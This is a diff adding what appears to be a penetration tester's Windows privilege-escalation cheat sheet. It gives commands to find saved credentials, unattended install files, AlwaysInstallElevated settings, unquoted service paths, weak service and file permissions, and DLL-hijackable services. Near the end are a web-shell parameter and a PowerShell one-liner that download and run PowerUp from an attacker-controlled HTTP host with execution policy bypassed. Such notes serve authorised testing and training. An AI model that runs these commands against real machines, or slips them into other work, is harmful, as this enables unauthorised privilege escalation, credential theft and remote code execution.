@@ -1,0 +1,146 @@
+* Gather Patches
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+
+
+* Unattended Installs
+
+dir c:\sysprep.inf
+dir c:\sysprep\sysprep.xml
+dir c:\Unattended.xml /s
+dir c:\sysprep.xml /s
+dir %WINDIR%\Panther\Unattend\Unattended.xml
+dir %WINDIR%\Panther\Unattended.xml
+
+* Check Always Elevated Installs
+# This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+* * Check Credential Store for saved/chached Passwords
+cmdkey.exe /list
+
+dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+
+Windows Service
+==================
+
+* Unquoted Service Path
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+The path for PFNet’s service binary is unquoted and contains spaces.
+
+* List all Services
+sc query
+
+* Service Parameters
+sc qc ServiceName
+
+* query Priviledges for a servic
+sc qprivs ServiceName
+
+* Change Configuration of a Service
+sc <server> config [service name] <option1> <option2>...
+
+Options:
+type=	<own|share|interact|kernel|filesys|rec|adapt|userown|usershare>
+start=	<boot|system|auto|demand|disabled|delayed-auto>
+error=	<normal|severe|critical|ignore>
+binPath=	<BinaryPathName to the .exe file>
+group=	<LoadOrderGroup>
+tag=	<yes|no>
+depend=	<Dependencies(separated by / (forward slash))>
+obj=	<AccountName|ObjectName>
+DisplayName=	<display name>
+password=	<password>
+
+* Find non-Windows Services
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+-> than check with icacls the permissions of the executeables
+-> vulnerable like Everyone:(I)(F)
+
+
+* Find weak Services
+C:\Users\Public\accesschk.exe -cuwv "user" *
+
+accesschk.exe -uwcqv "Group Name" *
+e.g.
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Everyone" *
+->> WIN if SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS i
+
+* Find weak Services with wmic
+	- list services
+		wmic service list brief
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+
+
+
+
+Weak File Permissions
+=======================
+
+* customn installed Software
+icacls scsiaccess.exe
+... outputs
+Everyone:(I)(F)
+
+* Find weak file permissions per Drive C
+ accesschk.exe -uwqs Users c:\*.*
+ accesschk.exe -uwqs "Authenticated Users" c:\*.*
+
+
+
+
+
+
+
+Default Vulnerable Windows Service:
+-----------------------------------
+
+* Windows 7 32/64
+
+IKE and AuthIP IPsec Keying Modules (IKEEXT)                     – wlbsctrl.dll
+Windows Media Center Receiver Service (ehRecvr)               – ehETW.dll
+Windows Media Center Scheduler Service (ehSched)             – ehETW.dll
+
+The Windows Media Center Services startup type is set to manual and status not started and will only give us only Network service privileges so I cannot see it to being much use especially with its limited privileges. It can however be started temporarily via certain scheduled tasks.
+
+schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\mcupdate”
+schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\MediaCenterRecoveryTask”
+schtasks.exe /run /I /TN “\Microsoft\Windows\Media Center\ActivateWindowsSearch”
+
+* Windows XP has shown that these Services are vulnerable
+
+Automatic Updates (wuauserv)                                                – ifsproxy.dll
+Remote Desktop Help Session Manager (RDSessMgr)            – SalemHook.dll
+Remote Access Connection Manager (RasMan)                      – ipbootp.dll
+Windows Management Instrumentation (winmgmt)                 – wbemcore.dll
+
+Audio Service (STacSV)                                                    – SFFXComm.dll SFCOM.DLL 
+Intel(R) Rapid Storage Technology (IAStorDataMgrSvc)    – DriverSim.dll
+Juniper Unified Network Service(JuniperAccessService)   – dsLogService.dll
+Encase Enterprise Agent                                                    – SDDisk.dll 
+
+
+
+
+
+* Information Gather Scripts
+
+- when having code execution via .asp/.php/...
+?fexec = echo "IEX(New-Object Net.WebClient).DownloadString('http://myip/PowerUp.ps') | powershell -noprofile -
+- with original PowerUp.ps1 on a http server without touching disk
+powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://10.10.0.192//pup.ps1’); Invoke-AllChecks”
+
+
+TASKS
+=====
+
+* Find scheduled tasks
+schtasks /query /fo LIST /v
+
